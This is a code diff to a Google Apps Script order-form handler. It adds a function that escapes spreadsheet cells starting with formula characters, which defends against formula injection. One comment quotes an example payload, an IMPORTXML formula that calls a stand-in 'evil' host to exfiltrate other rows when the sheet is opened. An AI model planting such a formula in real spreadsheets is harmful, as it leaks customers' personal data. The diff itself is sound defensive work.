@@ -70,11 +70,11 @@ function doPost(e) {
       timestamp,
       orderId,
       'Mới',
-      name,
-      phone,
-      String(body.product || ''),
-      String(body.message || ''),
-      String(body.page || ''),
+      neutralize(name),
+      neutralize(phone),
+      neutralize(String(body.product || '')),
+      neutralize(String(body.message || '')),
+      neutralize(String(body.page || '')),
       '',
       '',
     ]);
@@ -155,6 +155,20 @@ function findRecentDuplicate(phone, message) {
     }
   }
   return null;
+}
+
+/**
+ * Forces text interpretation for a cell. appendRow parses values as if
+ * they were typed into the UI (USER_ENTERED), so a value starting with
+ * = + - @ (or tab/CR) becomes a live formula — e.g. a message of
+ * '=IMPORTXML("https://evil/?q="&E2,"//x")' would exfiltrate other rows
+ * the moment the family opens the sheet. The leading apostrophe is a
+ * display-only text marker: the cell keeps the original characters and
+ * getValues() reads them back without it (so dedupe still compares raw).
+ */
+function neutralize(v) {
+  v = String(v || '');
+  return /^[=+\-@\t\r]/.test(v) ? "'" + v : v;
 }
 
 function json(obj) {
